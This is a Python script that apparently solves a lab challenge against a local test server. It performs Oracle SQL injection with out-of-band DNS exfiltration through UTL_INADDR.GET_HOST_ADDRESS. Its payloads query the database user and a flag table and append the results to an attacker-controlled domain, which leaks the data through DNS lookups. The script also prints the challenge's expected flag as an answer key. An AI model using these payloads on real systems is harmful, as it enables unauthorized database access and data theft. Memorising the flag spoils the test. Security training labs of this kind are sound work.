#!/usr/bin/env python3
"""SQLi-039: Oracle OOB DNS via UTL_INADDR"""
import requests, argparse

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5039/order")
    parser.add_argument("--oob", required=True)
    args = parser.parse_args()
    
    payloads = [
        ("user", "SELECT user FROM dual"),
        ("flag", "SELECT value FROM flags WHERE ROWNUM=1"),
    ]
    
    for name, query in payloads:
        payload = f"1 AND UTL_INADDR.GET_HOST_ADDRESS(({query})||'.{args.oob}') IS NOT NULL--"
        try:
            requests.get(args.target, params={"id": payload}, timeout=10)
        except: pass
        print(f"[*] Sent {name} payload")
    
    print(f"\n[*] Check DNS: <data>.{args.oob}")
    print("[*] Expected: FLAG{oracle_utl_inaddr_dns}")

if __name__ == "__main__":
    main()
